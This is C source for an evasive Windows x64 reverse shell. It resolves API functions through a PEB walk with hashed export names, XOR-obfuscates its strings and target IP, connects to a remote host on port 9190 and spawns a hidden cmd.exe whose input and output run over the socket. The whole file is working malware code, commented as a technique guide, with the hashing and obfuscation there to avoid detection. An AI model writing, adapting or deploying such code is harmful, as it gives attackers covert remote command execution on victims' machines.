#include "structs.h"
#include <stdio.h>
#include <inttypes.h>

#define LOADLIBRARYA_JS 	4035605851
#define CREATEPROCESSA_JS   3182156714
#define WSASTARTUP_JS		1260197060
#define WSASOCKETA_JS		2402613366
#define HTONS_JS			1648853536		
#define INET_ADDR_JS		2791415637
#define CONNECT_JS			1962494877

#define XOR_KEY 0x6b

// k32 apis
typedef HMODULE (WINAPI* LOADLIBRARYA)(LPCSTR lpcBuffer);
typedef BOOL (WINAPI* CREATEPROCESSA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// Ws2_32 apis (sockets)
typedef int (WINAPI* WSASTARTUP)(WORD wVersionRequired, LPWSADATA lpWSAData);
typedef SOCKET (WINAPI* WSASOCKETA)(int af, int type, int protocol, WSAPROTOCOL_INFOA* lpProtocolInfo, DWORD g, DWORD dwFlags);
typedef u_short (WINAPI* HTONS)(u_short hostshort);
typedef unsigned long (WINAPI* INET_ADDR)(const char* cp);
typedef int (WINAPI* CONNECT)(SOCKET s, struct sockaddr* name, int namelen);

void* memset(void* dest, int val, size_t len) { // define memset since we aren't using the C standard library
    unsigned char* p = (unsigned char*)dest;
    while (len--) *p++ = (unsigned char)val;
    return dest;
}

// Js Hashing algorithm
DWORD GetJsHash(PCSTR String) {
    DWORD HASH = 1315423911;
    while (*String) {
        HASH ^= (HASH << 5) + (BYTE)(*String) + (HASH >> 2);
        String++;
    }
    return HASH;
}

// Get Function Address via PEB Walk
HMODULE GetFuncAddr(DWORD64 FuncJsHash) {	
	PIMAGE_EXPORT_DIRECTORY ExportDir;
	DWORD FuncNumber, i;	
	PDWORD FuncNameBase;
	PCSTR FuncName;
	WORD OrdinalIndex;

	PPEB PebAddress = (PPEB) __readgsqword( 0x60 ); // Access the PEB structure directly via GS:[0x60] on x64.

	PPEB_LDR_DATA2 Ldr = (PPEB_LDR_DATA2) PebAddress->Ldr; // The PEB contains a pointer to PEB_LDR_DATA, which has a linked list of loaded modules.
	
	PLIST_ENTRY NextModule = Ldr->InLoadOrderModuleList.Flink; // This is the first module (usually the main EXE), and from here we walk the list.
	
	PLDR_DATA_TABLE_ENTRY2 DataTableEntry = (PLDR_DATA_TABLE_ENTRY2) NextModule; 
	
	while (DataTableEntry->DllBase != NULL) {	
		DWORD64 ModuleBase = (DWORD64)DataTableEntry->DllBase;	// Loop over all modules. DllBase is the base address of the module in memory.	

		PIMAGE_NT_HEADERS NTHeader = (PIMAGE_NT_HEADERS) ( ModuleBase + ((PIMAGE_DOS_HEADER) ModuleBase)->e_lfanew); // Locate NT headers using the PE structure (DOS header --> NT header).
		
		DWORD ExportDirRVA = NTHeader->OptionalHeader.DataDirectory[0].VirtualAddress; // This retrieves the Export Directory from the module.

		DataTableEntry = (PLDR_DATA_TABLE_ENTRY2) DataTableEntry->InLoadOrderLinks.Flink; // Get the next loaded module entry (ntdll.dll --> kernel32.dll)

		if (ExportDirRVA == 0) {
			continue;
		}	
		ExportDir = (PIMAGE_EXPORT_DIRECTORY) ((DWORD64) ModuleBase + ExportDirRVA); // Get a pointer to the actual export directory table.

		FuncNumber = ExportDir->NumberOfNames; 

		FuncNameBase = (PDWORD) ((PCHAR) ModuleBase + ExportDir->AddressOfNames);  // Extract names of all exported functions from the module.

		for (i = 0; i < FuncNumber; i++) {

			FuncName = (PCSTR) (*FuncNameBase + (DWORD64) ModuleBase); 

			FuncNameBase++;		

			if (GetJsHash(FuncName) == FuncJsHash) {	// For each function, hash its name and compare it to the input hash.	
							
				OrdinalIndex = *(PWORD)(((DWORD64) ModuleBase + ExportDir->AddressOfNameOrdinals) + (2 * i));

				return (HMODULE) ((DWORD64) ModuleBase + *(PDWORD)(((DWORD64) ModuleBase + ExportDir->AddressOfFunctions) + (4 * OrdinalIndex))); // If matched, resolve function address using its ordinal --> RVA --> VA.									
			}
		}
	}
	return NULL;
}

size_t strlen(const char *str) { // define strlen since we aren't using the C standard library
    const char *s = str;
    while (*s) s++;
    return s - str;
}

char* xor(char *string) {
	for (int i = 0; i < strlen(string); i++) {
        string[i] ^= XOR_KEY;
    }
    return string;
}

void rev() { 
	
	char ip[] = {0x5a,0x52,0x59,0x45,0x5a,0x5d,0x53,0x45,0x59,0x45,0x53, 0x6b};
	int port = 9190 ;

	//HEX ws2_32.dll   0x77  0x73  0x32  0x5f  0x33  0x32  0x2e  0x64  0x6c  0x6c  key
	char ws2_32_dll[] = {0x1c, 0x18, 0x59, 0x34, 0x58, 0x59, 0x45, 0x0f, 0x07, 0x07, 0x6b};

    //HEX powershell 0x70, 0x6f, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6c, 0x6c,  key
	//HEX cmd    0x63, 0xcd, 0x64, key
	char cmd[] = {0x08, 0x06, 0x0f, 0x6b};


	UINT64 pLoadLibraryA = (UINT64)GetFuncAddr(LOADLIBRARYA_JS);	// Get function addresses
	UINT64 pCreateProcessA = (UINT64)GetFuncAddr(CREATEPROCESSA_JS);	
	((LOADLIBRARYA)pLoadLibraryA)(xor(ws2_32_dll));
	UINT64 pWsaStartup = (UINT64)GetFuncAddr(WSASTARTUP_JS);
	UINT64 pWsaSocketA = (UINT64)GetFuncAddr(WSASOCKETA_JS);
	UINT64 pHtons = (UINT64)GetFuncAddr(HTONS_JS);
	UINT64 pInet_addr = (UINT64)GetFuncAddr(INET_ADDR_JS);
	UINT64 pConnect = (UINT64)GetFuncAddr(CONNECT_JS);

	WSADATA wsadata; // winsock struct declarations
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	struct sockaddr_in sa;

	((WSASTARTUP)pWsaStartup)(MAKEWORD(2, 2), &wsadata); // required before using winsock
	SOCKET socket = ((WSASOCKETA)pWsaSocketA)(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // creates the socket
	sa.sin_family = AF_INET;
	sa.sin_port = ((HTONS)pHtons)(port); 
	sa.sin_addr.s_addr = ((INET_ADDR)pInet_addr)(xor(ip)); // sets sa fields
	((CONNECT)pConnect)(socket, (struct sockaddr*)&sa, sizeof(sa)); // perform the connection
	size_t siLen = sizeof(si);
	memset(&si, 0 ,siLen); // fill in si (prep for CreateProcessA)
	si.cb = siLen;
	si.dwFlags = (STARTF_USESTDHANDLES);
	si.hStdInput = (HANDLE)socket;
	si.hStdOutput = (HANDLE)socket;
	si.hStdError = (HANDLE)socket;
	((CREATEPROCESSA)pCreateProcessA)(NULL, (LPSTR)xor(cmd), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi); // launches shell bound for socket
	
}


